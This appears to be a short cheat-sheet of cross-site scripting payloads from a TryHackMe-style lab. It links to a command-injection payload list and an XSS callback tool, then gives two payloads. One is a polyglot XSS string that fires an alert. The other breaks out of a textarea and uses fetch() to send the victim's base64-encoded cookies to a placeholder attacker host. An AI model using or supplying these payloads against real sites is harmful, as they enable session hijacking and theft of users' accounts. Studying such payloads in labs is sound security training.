General Information:
- Payloads
	https://github.com/payloadbox/command-injection-payload-list
- XSS Hunter Express
	https://github.com/mandatoryprogrammer/xsshunter-express


**One Size Beats All Injection:**

 ```
 /*-/*`/*\`/*'/*"/**/(/* */onerror=alert('THM')
 )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('THM')//>\x3e
 ```


**Basic Injection:**

```
 </textarea><script>fetch('http://{URL_OR_IP}?cookie=' + btoa(document.cookie) );</script>
```
 